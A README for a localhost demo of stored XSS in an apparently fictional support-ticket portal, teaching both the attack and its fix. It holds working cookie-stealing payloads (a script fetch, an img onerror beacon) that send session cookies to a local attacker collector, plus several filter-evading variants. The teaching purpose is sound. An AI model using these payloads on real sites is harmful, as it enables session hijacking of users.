# Stored XSS — NovaCRM Support Ticket Portal

## Port Reference

| Port | Role | File | npm script |
|------|------|------|------------|
| 3001 | Vulnerable victim | `victim-server.js` | `npm run vulnerable` |
| 3002 | Attacker collector | `attacker-server.js` | `npm run guide` |
| 3009 | Protected victim | `victim-server-protected.js` | `npm run secure` |

---

## Attack Flow

```
Attacker posts comment containing <script>fetch('//3002?c='+document.cookie)</script>
        ↓ (stored in DB)
NovaCRM (3001) renders comments on every page load — no escaping
        ↓
Victim visits the page
        ↓
Victim's browser executes the script → sends session cookie to attacker server (3002)
```

---

## How to Run

```bash
cd demo-attacked/xss/stored
npm install
```

Three terminals:

```
npm run vulnerable           # :3001
npm run guide                # :3002
npm run secure               # :3009
```

---

## Attack Walkthrough

1. Open `http://localhost:3001/admin` first — this sets the `agent_session` cookie.
2. Open `http://localhost:3002` in a separate window — attacker dashboard.
3. Open `http://localhost:3001` in a third tab — customer portal.
4. In the customer portal, submit a new ticket. Use these exact values:
   - Name: `Attacker`
   - Subject: `Having trouble logging in`
   - Message: `<img src="x" onerror="new Image().src='http://localhost:3002/steal?c='+encodeURIComponent(document.cookie)">`
5. The ticket appears in the **Recent Community Tickets** feed on the customer portal.
6. The `onerror` handler fires when the feed re-renders. Watch the cookie arrive on the attacker dashboard.

> **Note:** The admin dashboard (`/admin`) already uses `textContent` for ticket messages — a partial fix. The primary vulnerable render is the community ticket feed on `victim.html`.

---

## Vulnerable Lines

```js
// ⚠️ innerHTML parses ticket.message as HTML — scripts and event handlers execute
message.innerHTML = ticket.message;

// ⚠️ httpOnly: false — document.cookie exposes agent_session to stolen payloads
res.cookie('agent_session', '...', { path: '/', httpOnly: false });

// ⚠️ Raw user input stored with no sanitization
const ticket = { name, email, subject, message };
```

---

## The Fix

```js
// ✅ textContent treats value as literal text — never parsed as HTML
message.textContent = ticket.message;

// ✅ httpOnly: true — document.cookie cannot read this token
res.cookie('agent_session', '...', { path: '/', httpOnly: true });

// ✅ Strip HTML tags at ingestion (defense-in-depth)
const ticket = { name: sanitizeText(name), message: sanitizeText(message) };
```

---

## Why It Works

Stored XSS is the most dangerous variant. The attacker's payload is saved to the server — in a database, file, or in-memory store — and delivered to every user who views the affected page. No further action from the attacker is required after the initial submission.

This pattern is common in support ticket systems, comment sections, forum posts, CMS platforms, and any application that stores user-generated content and renders it later. Real-world incidents have affected platforms from MySpace (the Samy worm, 2005) to modern SaaS helpdesks where agent dashboards render ticket bodies as HTML.

When `innerHTML` receives a string containing `<img onerror>`, the browser constructs a real `HTMLImageElement`, sets its `src`, the `src` fails (no resource at `"x"`), and the browser fires `onerror` as a genuine DOM event — with full JavaScript privileges in the page's origin.

The `encodeURIComponent(document.cookie)` runs in the document context of `localhost:3001`, which holds `agent_session` (set when `/admin` was visited). The `new Image().src` technique sends a GET request to the attacker server without triggering a CORS preflight.

---

## Payload Variants

1. **`<img src="x" onerror="...">`** — Works even when `<script>` tags are filtered by a WAF or sanitizer that only blocks script elements.
2. **`<svg onload="...">`** — SVG elements fire `onload` without needing a `src` attribute.
3. **`<body onpageshow="...">`** — Fires when the page is shown or restored from the back-forward cache.

---

## Edge Cases

- **CSP alone is not enough:** `onerror` handlers are inline event attributes. Standard CSP does not block them without `'unsafe-inline'` explicitly denied AND a nonce-based policy.
- **Sanitizing only the message misses the name field:** Both fields were renderable via `innerHTML`. Auditors often check only obvious free-text fields.
- **DOMPurify for rich text:** If the app needs to allow some HTML (bold, links), use DOMPurify's allowlist approach. Never write your own allowlist logic.

---

## This Demo in Real Frameworks

The vulnerability is identical across frameworks — only the syntax differs.

**React:**
```jsx
// ⚠️ Byte-for-byte equivalent to innerHTML = ticket.message
<div dangerouslySetInnerHTML={{ __html: ticket.message }} />

// ✅ Safe — React escapes text by default
<div>{ticket.message}</div>
```

**Angular:**
```html
<!-- ⚠️ [innerHTML] binding is equivalent to innerHTML -->
<div [innerHTML]="ticket.message"></div>

<!-- ✅ Safe — text interpolation escapes HTML -->
<div>{{ ticket.message }}</div>
```

**Vue:**
```html
<!-- ⚠️ v-html is equivalent to innerHTML -->
<div v-html="ticket.message"></div>

<!-- ✅ Safe — mustache interpolation escapes HTML -->
<div>{{ ticket.message }}</div>
```

React, Angular, and Vue all escape text interpolation by default. The vulnerability only appears when the developer explicitly opts into raw HTML rendering. These escape hatches exist for legitimate cases (markdown rendering, rich-text editors) but must only be used with sanitized input.
